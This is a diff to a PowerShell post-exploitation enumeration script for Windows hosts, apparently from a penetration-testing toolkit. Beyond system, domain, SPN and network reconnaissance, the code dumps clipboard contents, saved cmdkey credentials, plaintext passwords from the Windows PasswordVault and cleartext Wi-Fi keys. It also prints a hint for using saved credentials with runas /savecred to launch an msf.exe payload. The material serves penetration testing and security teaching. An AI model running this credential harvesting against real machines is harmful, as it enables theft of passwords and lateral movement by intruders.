@@ -28,8 +28,8 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
-https://btps-secpack.com
+https://writeups.osbornepro.com
+https://www.btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
@@ -69,7 +69,7 @@ BEGIN
         [Alias('Computer')]
         [string]$ComputerName=$env:COMPUTERNAME )  # End param
 
-        $AntiVirusProducts = Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct"  -ComputerName $ComputerName
+        $AntiVirusProducts = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntiVirusProduct" -ComputerName $ComputerName
 
         $Ret = @()
         ForEach ($AntiVirusProduct in $AntiVirusProducts)
@@ -114,39 +114,78 @@ PROCESS
 #================================================================
 #  SECURITY PATCHES
 #================================================================
-    Write-Output "=================================`n| OPERATING SYSTEM INFORMATION |`n=================================" 
+    Write-Output "=================================`n| OPERATING SYSTEM INFORMATION  |`n================================="
     Get-CimInstance -ClassName "Win32_OperatingSystem" | Select-Object -Property Name,Caption,Description,CSName,Version,BuildNumber,OSArchitecture,SerialNumber,RegisteredUser
 
-    Write-Output "=================================`n|      DOMAIN INFORMATION      |`n================================="
+    Write-Output "=================================`n|      DOMAIN INFORMATION       |`n================================="
     $DomainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
     $Domain = New-Object -TypeName System.DirectoryServices.DirectoryEntry
     $DCs = $DomainObj.DomainControllers
-    $PDC = $DomainObj.Parent.PdcRoleOwner
+    $PDC = $DomainObj.PdcRoleOwner.Name
 
-    If ($Domain) { Write-Output "DOMAIN: $Domain"}
-    If ($DCs) { Write-Output "DOMAIN CONTROLLERS`n--------------------------"}
-    $DCs 
-    If ($PDC) { Write-Output "PRIMARY DC: $PDC"}
+    If ($Domain)
+    {
 
-    Write-Output "=================================`n| HOTFIXES INSTALLED ON DEVICE |`n=================================" 
-    Get-CimInstance -Query 'SELECT * FROM Win32_QuickFixEngineering'
+        Write-Output "DOMAIN DN: $($Domain.DistinguishedName.ToString())"
+        Write-Output "------------------------------------------------------"
+        Write-Output "PASSWORD POLICY"
+        Write-Output "------------------------------------------------------"
+        Write-Output "History Count: $($Domain.pwdHistoryLength.ToString())"
+        Write-Output "Password Properties: $($Domain.pwdProperties.ToString())"
+        Write-Output "Max Age: $($Domain.maxPwdAge.ToString())"
+        Write-Output "Minimum Character Length: $($Domain.minPwdLength.ToString())"
+        Write-Output "Lockout Threshold: $($Domain.lockoutThreshold.ToString())"
+        Write-Output "Last Changed: $($Domain.whenChanged.ToString())"
+        Write-Output "When Created: $($Domain.whenCreated.ToString())"
+
+    }  # End If
+
+    If ($DCs)
+    {
+
+        Write-Output "`n`n--------------------------`nDOMAIN CONTROLLERS`n--------------------------"
+
+    }  # End If
+
+    $DCs | Select-Object -Property Name,OSVersion,Domain | Format-Table -AutoSize
+
+    If ($PDC)
+    {
+
+        Write-Output "PRIMARY DC: $PDC"
+
+    }  # End If
+
+    Write-Output "=================================`n| HOTFIXES INSTALLED ON DEVICE  |`n================================="
+    If (Get-Command Get-HotFix)
+    {
+
+        Get-HotFix
+
+    }  # End If
+    Else
+    {
+
+        Get-CimInstance -Query 'SELECT * FROM Win32_QuickFixEngineering'
+
+    }  # End Else
 
     $WDigestCaching = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest").UseLogonCredential
     Switch ($WDigestCaching)
     {
 
-        '0' {Write-Output "[*] WDigest Caching is disabled"}
+        '0' { Write-Output "[*] WDigest Caching is disabled" }
 
-        '1' {Write-Output "[*] WDigest caching is enabled!"}
+        '1' { Write-Output "[*] WDigest caching is enabled!" }
 
-        $Null {Write-Output "[*] WDigest caching is enabled!"}
+        $Null { Write-Output "[*] WDigest caching is enabled!" }
 
     }  # End Switch
 
 #===================================================================
 #  NETWORK SHARES AND DRIVES
 #===================================================================
-Write-Output "=================================`n|  NEWORK SHARE DRIVES  |`n=================================" 
+Write-Output "=================================`n|  NEWORK SHARE DRIVES          |`n================================="
 Get-CimInstance -ClassName Win32_Share
 
 #===================================================================
@@ -159,43 +198,85 @@ Get-CimInstance -ClassName Win32_Share
 #===================================================================
 #  FIND SIGNED DRIVERS
 #===================================================================
-    Write-Output "SIGNED DRIVERS`n--------------------------------------------"
-    cmd /c 'DriverQuery -SI' | Select-String -Pattern "True"
+#    Write-Output "SIGNED DRIVERS`n--------------------------------------------"
+#    cmd /c 'DriverQuery -SI' | Select-String -Pattern "True"
 
 #==========================================================================
 #  ANTIVIRUS APPLICATION INFORMATION
 #==========================================================================
-    Write-Output "=================================`n|    ANTI-VIRUS INFORMATION    |`n=================================" 
+    Write-Output "=================================`n|    ANTI-VIRUS INFORMATION     |`n================================="
     Get-AntiVirusProduct
 
 #==========================================================================
 #  USER, USER PRIVILEDGES, AND GROUP INFO
 #==========================================================================
-    Write-Output "=================================`n|  LOCAL ADMIN GROUP MEMBERS  |`n=================================" 
-    Get-LocalGroupMember -Group "Administrators" | Format-Table -Property "Name","PrincipalSource"
+    Write-Output "================================================`n|  MEMBERS OF THE LOCAL ADMINISTRATORS GROUP   |`n================================================"
 
+    {
 
-    Write-Output "=================================`n|       USERS LIST       |`n================================="
-    Get-CimInstance -ClassName "Win32_UserAccount" | Format-Table -AutoSize
+        Get-LocalGroupMember -Group "Administrators" | Format-Table -Property "Name","PrincipalSource"
 
+    }  # End
+    Write-Output "=================================`n|       USERS LIST              |`n================================="
+    Try
+    {
 
-    Write-Output "=================================`n|       GROUPS LIST       |`n=================================" 
-    Get-CimInstance -ClassName "Win32_GroupUser" | Format-Table -AutoSize
+        Get-LocalUser | Select-Object -Property Name,Enabled,LastLogon,SID,PasswordRequired | Format-Table -AutoSize
 
+    }  # End Try
+    Catch
+    {
 
-    Write-Output "=================================`n|  CURRENT USER PRIVS   |`n=================================" 
+        net user
+        # Get-CimInstance -ClassName "Win32_UserAccount" | Format-Table -AutoSize
+
+    }  # End Catch
+
+    Write-Output "=================================`n|       GROUPS LIST             |`n================================="
+    Try
+    {
+
+        Get-LocalGroup | Select-Object -Property Name,Description,SID | Format-Table -AutoSize
+
+    }  # End Try
+    Catch
+    {
+
+        net group
+        # Get-CimInstance -ClassName "Win32_GroupUser" | Format-Table -AutoSize
+
+    }  # End Catch
+
+    Write-Output "`n=================================`n|  CURRENT USER PRIVS           |`n================================="
     whoami /priv
 
 
-    Write-Output "=================================`n| USERS WHO HAVE HOME DIRS |`n=================================" 
+    Write-Output "`n=================================`n| USERS WHO HAVE HOME DIRS      |`n================================="
     Get-ChildItem -Path C:\Users | Select-Object -Property "Name"
 
 
-    Write-Output "=================================`n|  CLIPBOARD CONTENTS  |`n=================================" 
+    Write-Output "`n=================================`n|  SPN ACCOUNTS                 |`n================================="
+    $Search = New-Object -TypeName DirectoryServices.DirectorySearcher([ADSI]"")
+    $Search.Filter = "(servicePrincipalName=*)"
+    $Results = $Search.Findall()
+    $SPNObj = @()
+
+    ForEach ($Result in $Results)
+    {
+
+    	$UserEntry = $Result.GetDirectoryEntry()
+        $SPNObj += New-Object -TypeName PSObject -Property @{Name=$($UserEntry.name);DN=$($UserEntry.distinguishedName);Category=$($UserEntry.objectCategory)}
+
+    }  # End ForEach
+
+    $SPNObj | Format-Table
+
+
+    Write-Output "=================================`n|  CLIPBOARD CONTENTS           |`n================================="
     Get-Clipboard
 
 
-    Write-Output "=================================`n|  SAVED CREDENTIALS  |`n=================================" 
+    Write-Output "=================================`n|  SAVED CREDENTIALS            |`n================================="
     cmdkey /list
     Write-Output "If you find a saved credential it can be used issuing a command in the below format: "
     Write-Output 'runas /savecred /user:WORKGROUP\Administrator "\\###.###.###.###\FileShare\msf.exe"'
@@ -203,17 +284,17 @@ Get-CimInstance -ClassName Win32_Share
     [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object -TypeName Windows.Security.Credentials.PasswordVault).RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ }
 
 
-    Write-Output "=================================`n|  SIGNED IN USERS  |`n=================================" 
+    Write-Output "=================================`n|  LOGGGED ON USERS             |`n================================="
     Get-CimInstance -ClassName Win32_LoggedOnUser
 
 
-    Write-Output "=========================================`n|  CURRENT KERBEROS TICKET PERMISSIONS  |`n=========================================" 
+    Write-Output "=========================================`n|  CURRENT KERBEROS TICKET PERMISSIONS  |`n========================================="
     [System.Security.Principal.WindowsIdentity]::GetCurrent()
 
 #==========================================================================
 #  NETWORK INFORMATION
 #==========================================================================
-    Write-Output "=================================`n|   LISTENING PORTS   |`n================================="
+    Write-Output "=================================`n|   LISTENING PORTS             |`n================================="
     Get-CimInstance -Class Win32_SerialPort | Select-Object -Property Name, Description, DeviceID
     $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
     $Connections = $TCPProperties.GetActiveTcpListeners()
@@ -225,38 +306,38 @@ Get-CimInstance -ClassName Win32_Share
 
     }  # End ForEach
 
-    Write-Output "=================================`n|  ESTABLISHED CONNECTIONS  |`n================================="
+    Write-Output "=================================`n|  ESTABLISHED CONNECTIONS      |`n================================="
     $OutputObj = @()
-    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
-    $Connections = $TCPProperties.GetActiveTcpConnections()            
-    ForEach ($Connection in $Connections) 
+    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
+    $Connections = $TCPProperties.GetActiveTcpConnections()
+    ForEach ($Connection in $Connections)
     {
 
-        If ($Connection.LocalEndPoint.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } Else { $IPType = "IPv6" }            
+        If ($Connection.LocalEndPoint.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } Else { $IPType = "IPv6" }
         $OutputObj += New-Object -TypeName PSObject -Property @{LocalAddress=$Connection.LocalEndPoint.Address; LocalPort=$Connection.LocalEndPoint.Port; RemoteAddress=$Connection.RemoteEndPoint.Address; RemotePort=$Connection.RemoteEndPoint.Port; State=$Connection.State; AddressType=$IPType}
 
     }  # End ForEach
     $OutputObj | Format-Table -AutoSize
 
-    Write-Output "=================================`n|  DNS SERVERS  |`n=================================" 
+    Write-Output "=================================`n|  DNS SERVERS                  |`n================================="
     Get-DnsClientServerAddress -AddressFamily "IPv4" | Select-Object -Property "InterfaceAlias","ServerAddresses" | Format-Table -AutoSize
 
 
-    Write-Output "=================================`n|  ROUTING TABLE  |`n=================================" 
+    Write-Output "=================================`n|  ROUTING TABLE                |`n================================="
     Get-NetRoute | Select-Object -Property "DestinationPrefix","NextHop","RouteMetric" | Format-Table -AutoSize
 
 
-    Write-Output "=================================`n|    ARP NEIGHBOR TABLE    |`n=================================" 
+    Write-Output "=================================`n|    ARP NEIGHBOR TABLE         |`n================================="
     Get-NetNeighbor | Select-Object -Property "IPAddress","LinkLayerAddress","State" | Format-Table -AutoSize
 
 
-    Write-Output "=================================`n|  Wi-Fi Passwords  |`n=================================" 
+    Write-Output "=================================`n|  Wi-Fi Passwords              |`n================================="
     (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
 
 #==========================================================================
 #  APPLICATION INFO
 #==========================================================================
-    Write-Output "=================================`n| INSTALLED APPLICATIONS |`n=================================" 
+    Write-Output "=================================`n| INSTALLED APPLICATIONS        |`n================================="
     $Paths = 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\'
     ForEach ($Path in $Paths)
     {
@@ -265,7 +346,7 @@ Get-CimInstance -ClassName Win32_Share
 
     }  # End ForEach
 
-    Write-Output "=================================`n| STARTUP APPLICATIONS |`n=================================" 
+    Write-Output "=================================`n|    STARTUP APPLICATIONS       |`n================================="
     Get-CimInstance -ClassName "Win32_StartupCommand" | Select-Object -Property "Name","Command","Location","User" | Format-Table -AutoSize
 
     $StartupAppCurrentUser = (Get-ChildItem -Path "C:\Users\$env:USERNAME\Start Menu\Programs\Startup" | Select-Object -ExpandProperty "Name" | Out-String).Trim()
@@ -296,28 +377,28 @@ Get-CimInstance -ClassName Win32_Share
 #==========================================================================
 #  PROCESS AND SERVICE ENUMERATION
 #==========================================================================
-    Write-Output "=================================`n|  PROCESS ENUMERATION  |`n=================================" 
+    Write-Output "=================================`n|  PROCESS ENUMERATION          |`n================================="
     Get-Process -IncludeUserName | Format-Table -AutoSize
 
 
-    Write-Output "=================================`n|  SERVICE ENUMERATION  |`n=================================" 
-    Get-cimInstance -ClassName Win32_Service
+    Write-Output "=================================`n|  SERVICE ENUMERATION          |`n================================="
+    Get-CimInstance -ClassName Win32_Service
 
 
-    Write-Output "=================================`n|  ENVIRONMENT VARIABLES  |`n=================================" 
-    [Environment]::GetEnvironmentVariables()
+    Write-Output "=================================`n|  ENVIRONMENT VARIABLES        |`n================================="
+    [Environment]::GetEnvironmentVariables() | Format-Table -AutoSize
 
 #==========================================================================
 # BROWSER INFO
 #==========================================================================
-    Write-Output "================================`n| BROWSER ENUMERATION |`n==================================="
+    Write-Output "=================================`n|  BROWSER ENUMERATION          |`n================================="
     Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name "start page" | Select-Object -Property "Start Page"
 
     $Bookmarks = [Environment]::GetFolderPath('Favorites')
     Get-ChildItem -Path $BookMarks -Recurse -Include "*.url" | ForEach-Object {
-        
+
         Get-Content -Path $_.FullName | Select-String -Pattern URL
-        
+
     }  # End ForEach-Object
 
 }  # End PROCESS
